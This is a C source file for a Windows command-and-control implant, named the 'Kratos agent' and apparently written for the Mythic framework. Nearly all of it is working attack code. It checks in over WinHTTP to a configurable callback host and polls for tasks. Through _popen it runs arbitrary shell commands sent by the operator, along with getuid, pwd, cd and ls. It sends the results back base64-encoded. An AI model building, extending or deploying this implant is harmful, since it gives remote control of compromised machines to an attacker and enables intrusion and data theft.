#define _WIN32_WINNT 0x0600
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

// Check Config.h values
#ifndef CALLBACK_HOST
#define CALLBACK_HOST "127.0.0.1"
#endif

#ifndef CALLBACK_PORT
#define CALLBACK_PORT 80
#endif

#ifndef SLEEP_TIME
#define SLEEP_TIME 5
#endif

#ifndef UUID
// #define AGENT_UUID "00000000-0000-0000-0000-000000000000"
// COMMENTED OUT TO FORCE BUILD ERROR IF NOT DEFINED
#endif

#ifndef CONFIG_H

#endif

#if DEBUG
#define DEBUG_PRINT(...)                                                       \
  do {                                                                         \
    fprintf(stdout, "[DEBUG] ");                                               \
    fprintf(stdout, __VA_ARGS__);                                              \
    fprintf(stdout, "\n");                                                     \
    fflush(stdout);                                                            \
  } while (0)
#else
#define DEBUG_PRINT(...)                                                       \
  do {                                                                         \
  } while (0)
#endif

char current_uuid[128];

// Base64 tables
static const char base64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static int b64_inv[256];
static int b64_inv_init = 0;

char *base64_encode(const unsigned char *src, size_t len) {
  unsigned char *out, *pos;
  const unsigned char *end, *in;
  size_t olen;

  olen = len * 4 / 3 + 4;
  olen += olen / 72;
  olen++;
  out = (char *)malloc(olen);
  if (out == NULL)
    return NULL;

  end = src + len;
  in = src;
  pos = (unsigned char *)out;
  while (end - in >= 3) {
    *pos++ = base64_table[in[0] >> 2];
    *pos++ = base64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
    *pos++ = base64_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];
    *pos++ = base64_table[in[2] & 0x3f];
    in += 3;
  }

  if (end - in) {
    *pos++ = base64_table[in[0] >> 2];
    if (end - in == 1) {
      *pos++ = base64_table[(in[0] & 0x03) << 4];
      *pos++ = '=';
      *pos++ = '=';
    } else {
      *pos++ = base64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
      *pos++ = base64_table[(in[1] & 0x0f) << 2];
      *pos++ = '=';
    }
  }

  *pos = '\0';
  return out;
}

void init_b64_inv() {
  if (b64_inv_init)
    return;
  for (int i = 0; i < 256; i++)
    b64_inv[i] = -1;
  for (int i = 0; i < 64; i++)
    b64_inv[(unsigned char)base64_table[i]] = i;
  b64_inv['='] = 0;
  b64_inv_init = 1;
}

char *base64_decode(const char *src, size_t len) {
  init_b64_inv();
  char *out = (char *)malloc(len);
  int i = 0, j = 0;
  int v = 0;
  int bits = 0;
  for (i = 0; i < len; i++) {
    if (src[i] == '\0')
      break;
    int val = b64_inv[(unsigned char)src[i]];
    if (val == -1)
      continue;
    v = (v << 6) | val;
    bits += 6;
    if (bits >= 8) {
      bits -= 8;
      out[j++] = (v >> bits) & 0xFF;
    }
  }
  out[j] = '\0';
  return out;
}

// NETWORK using WinHTTP

void log_error(const char *msg) {
#if DEBUG
  DWORD err = GetLastError();
  DEBUG_PRINT("%s. Error Code: %lu", msg, err);
#endif
}

char *send_c2_message(const char *json_msg) {
  HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
  char *response_buffer = NULL;

  DEBUG_PRINT("Sending C2 message: %s", json_msg);

  // Parse Host
  char host[256];
  strncpy(host, CALLBACK_HOST, sizeof(host) - 1);

  char *p = strstr(host, "://");
  char *actual_host = p ? p + 3 : host;

  // Use Unicode for WinHTTP
  wchar_t wUserAgent[512];
  mbstowcs(wUserAgent, USER_AGENT, 512);

  hSession = WinHttpOpen(wUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) {
    log_error("WinHttpOpen failed");
    return NULL;
  }

  wchar_t wHost[256];
  mbstowcs(wHost, actual_host, 256);

  hConnect = WinHttpConnect(hSession, wHost, CALLBACK_PORT, 0);
  if (!hConnect) {
    log_error("WinHttpConnect failed");
    WinHttpCloseHandle(hSession);
    return NULL;
  }

  wchar_t wObject[256];
  mbstowcs(wObject, POST_URI, 256);

  hRequest =
      WinHttpOpenRequest(hConnect, L"POST", wObject, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  if (!hRequest) {
    log_error("WinHttpOpenRequest failed");
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return NULL;
  }

  // Prepend UUID to message (Mythic plaintext format requirement)
  // Even with AESPSK=none, Mythic expects: Base64(PayloadUUID + JSON)
  size_t json_len = strlen(json_msg);
  size_t total_len = 36 + json_len;
  char *data_with_uuid = (char *)malloc(total_len + 1);
  char *b64_msg = NULL;

  if (data_with_uuid) {
    memcpy(data_with_uuid, current_uuid, 36);
    memcpy(data_with_uuid + 36, json_msg, json_len);
    data_with_uuid[total_len] = '\0';

    b64_msg = base64_encode((const unsigned char *)data_with_uuid, total_len);
    free(data_with_uuid);
  }

  if (!b64_msg) {
    log_error("Failed to encode message");
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return NULL;
  }

  DEBUG_PRINT("Sent B64 Msg (len: %lu): %.100s...",
              (unsigned long)strlen(b64_msg), b64_msg);

  BOOL bResults =
      WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, b64_msg,
                         strlen(b64_msg), strlen(b64_msg), 0);

  if (!bResults) {
    log_error("WinHttpSendRequest failed");
  } else {
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
      log_error("WinHttpReceiveResponse failed");
    } else {
      DWORD dwStatusCode = 0;
      DWORD dwSize = sizeof(dwStatusCode);
      if (WinHttpQueryHeaders(
              hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
              WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize,
              WINHTTP_NO_HEADER_INDEX)) {
        DEBUG_PRINT("HTTP Status Code: %lu", dwStatusCode);
      }
    }
  }

  if (bResults) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;

    do {
      dwSize = 0;
      if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
        log_error("WinHttpQueryDataAvailable failed");
        break;
      }
      DEBUG_PRINT("Data Available: %lu bytes", dwSize);

      if (dwSize == 0)
        break;

      char *file_buffer = (char *)malloc(dwSize + 1);
      if (!file_buffer)
        break;

      ZeroMemory(file_buffer, dwSize + 1);

      if (WinHttpReadData(hRequest, (LPVOID)file_buffer, dwSize,
                          &dwDownloaded)) {
        DEBUG_PRINT("Read Data: %lu bytes", dwDownloaded);
        if (response_buffer == NULL) {
          response_buffer = file_buffer;
        } else {
          size_t old_len = strlen(response_buffer);
          response_buffer =
              (char *)realloc(response_buffer, old_len + dwDownloaded + 1);
          memcpy(response_buffer + old_len, file_buffer, dwDownloaded);
          response_buffer[old_len + dwDownloaded] = 0;
          free(file_buffer);
        }
      } else {
        log_error("WinHttpReadData failed");
        free(file_buffer);
      }
    } while (dwSize > 0);
  }

  free(b64_msg);
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  if (hConnect)
    WinHttpCloseHandle(hConnect);
  if (hSession)
    WinHttpCloseHandle(hSession);

  if (response_buffer) {
    DEBUG_PRINT("Received response (len: %lu)",
                (unsigned long)strlen(response_buffer));
  } else {
    DEBUG_PRINT("No response received");
  }

  return response_buffer;
}

char *execute_shell(const char *cmd) {
  char path[2048];
  char *output = (char *)malloc(1);
  output[0] = 0;
  size_t total_len = 0;

  char cmd_full[2048];
  snprintf(cmd_full, sizeof(cmd_full), "%s 2>&1", cmd);

  FILE *pipe = _popen(cmd_full, "r");
  if (!pipe)
    return strdup("Failed to open pipe");

  while (fgets(path, sizeof(path), pipe) != NULL) {
    size_t len = strlen(path);
    output = (char *)realloc(output, total_len + len + 1);
    memcpy(output + total_len, path, len);
    total_len += len;
    output[total_len] = 0;
  }
  _pclose(pipe);
  return output;
}

// Convert OEM Console Output to UTF-8
char *ConsoleOutputToUTF8(const char *input) {
  if (!input)
    return strdup("");

  // 1. Convert console encoding (OEM) to UTF-16
  // CP_OEMCP is usually the console codepage
  int wlen = MultiByteToWideChar(CP_OEMCP, 0, input, -1, NULL, 0);
  if (wlen == 0)
    return strdup(input);

  wchar_t *wstr = (wchar_t *)malloc(wlen * sizeof(wchar_t));
  if (!wstr)
    return strdup(input);

  MultiByteToWideChar(CP_OEMCP, 0, input, -1, wstr, wlen);

  // 2. Convert UTF-16 to UTF-8
  int ulen = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
  if (ulen == 0) {
    free(wstr);
    return strdup(input);
  }

  char *utf8 = (char *)malloc(ulen);
  if (!utf8) {
    free(wstr);
    return strdup(input);
  }

  WideCharToMultiByte(CP_UTF8, 0, wstr, -1, utf8, ulen, NULL, NULL);
  free(wstr);

  return utf8;
}

// Helper to extract JSON string value securely AND unescape it
void extract_json_string(const char *json, const char *key, char *buffer,
                         size_t buffer_size) {
  char key_pattern[64];
  snprintf(key_pattern, sizeof(key_pattern), "\"%s\"", key);

  char *key_ptr = strstr(json, key_pattern);
  if (!key_ptr)
    return;

  char *val_start = strchr(key_ptr, ':');
  if (!val_start)
    return;

  val_start = strchr(val_start, '"');
  if (!val_start)
    return;
  val_start++; // skip opening quote

  size_t i = 0;
  const char *p = val_start;
  while (*p && i < buffer_size - 1) {
    if (*p == '"')
      break;

    if (*p == '\\') {
      p++;
      if (!*p)
        break;
      // Minimal unescape
      if (*p == 'n')
        buffer[i++] = '\n';
      else if (*p == 'r')
        buffer[i++] = '\r';
      else if (*p == 't')
        buffer[i++] = '\t';
      else if (*p == '"')
        buffer[i++] = '"';
      else if (*p == '\\')
        buffer[i++] = '\\';
      else
        buffer[i++] = *p;
    } else {
      buffer[i++] = *p;
    }
    p++;
  }
  buffer[i] = 0;
}

// Helper to escape JSON string properly for output (UTF-8 Aware)
char *json_escape(const char *str) {
  if (!str)
    return strdup("");

  size_t len = strlen(str);
  size_t new_len = len * 2 + 1; // Worst case each char needs escaping
  char *escaped = (char *)malloc(new_len);
  if (!escaped)
    return strdup("");

  size_t j = 0;
  for (size_t i = 0; i < len; i++) {
    unsigned char c = (unsigned char)str[i];
    if (c == '"') {
      escaped[j++] = '\\';
      escaped[j++] = '"';
    } else if (c == '\\') {
      escaped[j++] = '\\';
      escaped[j++] = '\\';
    } else if (c == '\n') {
      escaped[j++] = '\\';
      escaped[j++] = 'n';
    } else if (c == '\r') {
      // Ignore carriage return
    } else if (c == '\t') {
      escaped[j++] = '\\';
      escaped[j++] = 't';
    } else if (c < 32) {
      // Control chars < 32 are invalid in JSON string (except escapes above)
      escaped[j++] = '.';
    } else {
      // Allow printable ASCII and Extended ASCII (UTF-8 bytes > 127)
      escaped[j++] = c;
    }
  }
  escaped[j] = 0;
  return escaped;
}

// Helper to send task response
void send_task_response(const char *task_id, const char *raw_output) {
  char *utf8_output = ConsoleOutputToUTF8(raw_output);
  char *escaped_output = json_escape(utf8_output ? utf8_output : "");

  // Allocate sufficiently large buffer
  size_t resp_len = strlen(escaped_output) + 512 + strlen(task_id);
  char *resp_msg = (char *)malloc(resp_len);

  if (resp_msg) {
    snprintf(resp_msg, resp_len,
             "{\"action\": \"post_response\", \"responses\": "
             "[{\"task_id\": \"%s\", \"user_output\": \"%s\", "
             "\"status\": \"success\", \"completed\": true}]}",
             task_id, escaped_output);

    send_c2_message(resp_msg);
    free(resp_msg);
  }

  free(escaped_output);
  free(utf8_output);
}

#include "Checkin.h"

int main() {
  strncpy(current_uuid, AGENT_UUID, sizeof(current_uuid) - 1);
  current_uuid[sizeof(current_uuid) - 1] = '\0';

  DEBUG_PRINT("Kratos agent started.");
  DEBUG_PRINT("UUID: %s", current_uuid);
  DEBUG_PRINT("Target: %s:%d%s", CALLBACK_HOST, CALLBACK_PORT, POST_URI);

  while (1) {
    // Checkin Logic
    if (strncmp(current_uuid, AGENT_UUID, 36) == 0) {
      if (CheckinSend()) {
        DEBUG_PRINT("Checkin successful. UUID updated to: %s", current_uuid);
      } else {
        DEBUG_PRINT("Checkin failed/retrying...");
      }
    } else {
      // Get Tasking
      char json_msg[4096];
      snprintf(json_msg, sizeof(json_msg),
               "{\"action\": \"get_tasking\", \"tasking_size\": -1, \"uuid\": "
               "\"%s\"}",
               current_uuid);

      char *b64_resp = send_c2_message(json_msg);

      if (b64_resp && strlen(b64_resp) > 0) {
        char *full_decoded = base64_decode(b64_resp, strlen(b64_resp));
        char *json_resp = full_decoded;

        if (full_decoded) {
          if (full_decoded[0] != '{' && strlen(full_decoded) > 36) {
            json_resp = full_decoded + 36;
          }

          DEBUG_PRINT("Decoded JSON: %.100s...", json_resp);

          char *tasks_ptr = strstr(json_resp, "\"tasks\"");
          if (tasks_ptr) {
            char *cmd_local_ptr = tasks_ptr;

            while ((cmd_local_ptr = strstr(cmd_local_ptr, "\"command\""))) {
              char cmd_name[32] = {0};
              extract_json_string(cmd_local_ptr, "command", cmd_name,
                                  sizeof(cmd_name));

              char task_id[64] = {0};
              extract_json_string(cmd_local_ptr, "id", task_id,
                                  sizeof(task_id));

              char params[2048] = {0};
              extract_json_string(cmd_local_ptr, "parameters", params,
                                  sizeof(params));

              if (strlen(cmd_name) > 0) {
                printf("Processing task: %s (ID: %s) Params: %s\n", cmd_name,
                       task_id, params);

                // Dummy block to start the else-if chain
                if (0) {
                }

#ifdef INCLUDE_CMD_RUN
                else if (strcmp(cmd_name, "run") == 0 ||
                         strcmp(cmd_name, "shell") == 0) {
                  // Handle RUN or SHELL
                  char executable[512] = {0};
                  char arguments[1024] = {0};
                  char full_cmd[2048] = {0};

                  if (params[0] == '{') {
                    // Structured JSON
                    extract_json_string(params, "executable", executable,
                                        sizeof(executable));
                    extract_json_string(params, "arguments", arguments,
                                        sizeof(arguments));
                  } else {
                    // Legacy raw shell
                    strncpy(arguments, params, sizeof(arguments) - 1);
                  }

                  if (strlen(executable) > 0) {
                    snprintf(full_cmd, sizeof(full_cmd), "%s %s", executable,
                             arguments);
                  } else {
                    strncpy(full_cmd, arguments, sizeof(full_cmd) - 1);
                  }

                  printf("Executing: %s\n", full_cmd);
                  char *output = execute_shell(full_cmd);
                  send_task_response(task_id, output);
                  if (output)
                    free(output);
                }
#endif

#ifdef INCLUDE_CMD_GETUID
                else if (strcmp(cmd_name, "getuid") == 0) {
                  char username[256] = {0};
                  DWORD len = sizeof(username);
                  if (GetUserName(username, &len)) {
                    send_task_response(task_id, username);
                  } else {
                    send_task_response(task_id, "Failed to get username");
                  }
                }
#endif

#ifdef INCLUDE_CMD_PWD
                else if (strcmp(cmd_name, "pwd") == 0) {
                  char path[MAX_PATH] = {0};
                  if (GetCurrentDirectory(MAX_PATH, path)) {
                    send_task_response(task_id, path);
                  } else {
                    send_task_response(task_id,
                                       "Failed to get current directory");
                  }
                }
#endif

#ifdef INCLUDE_CMD_CD
                else if (strcmp(cmd_name, "cd") == 0) {
                  char path[MAX_PATH] = {0};
                  if (params[0] == '{') {
                    extract_json_string(params, "path", path, sizeof(path));
                  } else {
                    strncpy(path, params, sizeof(path) - 1);
                  }

                  // Remove quotes if present
                  if (path[0] == '"') {
                    char tmp[MAX_PATH];
                    strncpy(tmp, path + 1, sizeof(path) - 2);
                    tmp[strlen(tmp) - 1] = 0;
                    strncpy(path, tmp, sizeof(path));
                  }

                  if (strlen(path) > 0 && SetCurrentDirectory(path)) {
                    char new_path[MAX_PATH];
                    GetCurrentDirectory(MAX_PATH, new_path);
                    char output[MAX_PATH + 50];
                    snprintf(output, sizeof(output), "Changed directory to: %s",
                             new_path);
                    send_task_response(task_id, output);
                  } else {
                    send_task_response(task_id, "Failed to change directory.");
                  }
                }
#endif

#ifdef INCLUDE_CMD_LS
                else if (strcmp(cmd_name, "ls") == 0) {
                  char path[MAX_PATH] = {0};
                  if (params[0] == '{') {
                    extract_json_string(params, "path", path, sizeof(path));
                  } else {
                    strncpy(path, params, sizeof(path) - 1);
                  }

                  char cmd[MAX_PATH + 20] = "dir ";
                  // Quote path to handle spaces
                  if (strlen(path) > 0) {
                    strncat(cmd, "\"", sizeof(cmd) - strlen(cmd) - 1);
                    strncat(cmd, path, sizeof(cmd) - strlen(cmd) - 1);
                    strncat(cmd, "\"", sizeof(cmd) - strlen(cmd) - 1);
                  }

                  char *output = execute_shell(cmd);
                  send_task_response(task_id, output);
                  if (output)
                    free(output);
                }
#endif

#ifdef INCLUDE_CMD_EXIT
                else if (strcmp(cmd_name, "exit") == 0) {
                  exit(0);
                }
#endif
              }
              cmd_local_ptr += 1;
            }
          }
          free(full_decoded);
        }
        free(b64_resp);
      }
    }
    Sleep(SLEEP_TIME * 1000);
  }
  return 0;
}
